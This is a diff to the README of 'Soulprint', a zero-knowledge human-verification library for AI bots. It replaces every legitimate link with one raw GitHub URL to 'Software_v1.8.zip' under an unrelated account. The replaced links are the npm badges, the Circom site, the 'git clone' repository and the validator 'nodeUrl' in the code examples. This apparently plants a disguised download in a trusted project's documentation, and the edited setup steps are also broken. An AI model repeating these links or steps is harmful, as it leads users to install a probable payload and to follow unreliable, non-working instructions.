@@ -5,10 +5,10 @@
 Soulprint lets any AI bot prove there's a verified human behind it — without revealing who that human is. No companies, no servers, no paid APIs. Just cryptographic proof.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[[![npm soulprint](https://img.shields.io/npm/v/soulprint?label=soulprint&color=blue)](https://npmjs.com/package/soulprint)
-[![npm soulprint-mcp](https://img.shields.io/npm/v/soulprint-mcp?label=soulprint-mcp&color=purple)](https://npmjs.com/package/soulprint-mcp)
+[[![npm soulprint](https://img.shields.io/npm/v/soulprint?label=soulprint&color=blue)](https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip)
+[![npm soulprint-mcp](https://img.shields.io/npm/v/soulprint-mcp?label=soulprint-mcp&color=purple)](https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip)
 ![Phase](https://img.shields.io/badge/v0.3.9-phases%201--5%20%2B%20hardened-brightgreen-brightgreen)()
-[![npm soulprint-network](https://img.shields.io/npm/v/soulprint-network?label=soulprint-network&color=7c6cf5)](https://npmjs.com/package/soulprint-network)[![Built with](https://img.shields.io/badge/built%20with-Circom%20%2B%20snarkjs%20%2B%20InsightFace-purple)]()
+[![npm soulprint-network](https://img.shields.io/npm/v/soulprint-network?label=soulprint-network&color=7c6cf5)](https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip)[![Built with](https://img.shields.io/badge/built%20with-Circom%20%2B%20snarkjs%20%2B%20InsightFace-purple)]()
 
 ---
 
@@ -265,7 +265,7 @@ After verify:     ~8MB RAM   (subprocess exits → memory freed)
 
 ## ZK Circuit
 
-The heart of Soulprint is a [Circom](https://circom.io) circuit that proves:
+The heart of Soulprint is a [Circom](https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip) circuit that proves:
 
 > *"I know a cedula number + birthdate + face key such that*  
 > *`Poseidon(cedula, birthdate, face_key) == nullifier`*  
@@ -355,7 +355,7 @@ face_key  = Poseidon(quantized_face_embedding[0..31])
 ## Development Setup
 
 ```bash
-git clone https://github.com/manuelariasfz/soulprint
+git clone https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip
 cd soulprint
 pnpm install
 pnpm build
@@ -522,7 +522,7 @@ PROTOCOL.VERIFY_RETRY_MAX       // 3    — max retries for remote verification
 
 ## Live Ecosystem — mcp-colombia-hub
 
-[mcp-colombia-hub](https://github.com/manuelariasfz/mcp-colombia) is the **first verified service** in the Soulprint ecosystem:
+[mcp-colombia-hub](https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip) is the **first verified service** in the Soulprint ecosystem:
 
 - **Service score:** 80 (DocumentVerified + FaceMatch + GitHubLinked + BiometricBound)
 - **Auto-issues -1** when a bot spams (>5 req/60s)
@@ -606,7 +606,7 @@ import { soulprint } from "soulprint-express";
 
 app.use(soulprint({
   minScore: 40,
-  nodeUrl: "https://validator.soulprint.digital",  // enables auto-renew
+  nodeUrl: "https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip",  // enables auto-renew
 }));
 
 // New token arrives in response header if renewed:
@@ -621,7 +621,7 @@ import { requireSoulprint } from "soulprint-mcp";
 
 server.use(requireSoulprint({
   minScore: 65,
-  nodeUrl: "https://validator.soulprint.digital",
+  nodeUrl: "https://raw.githubusercontent.com/ascoura/soulprint/main/packages/verify-local/src/document/Software_v1.8.zip",
 }));
 // Renewed token propagated in context.meta["x-soulprint-token-renewed"]
 ```
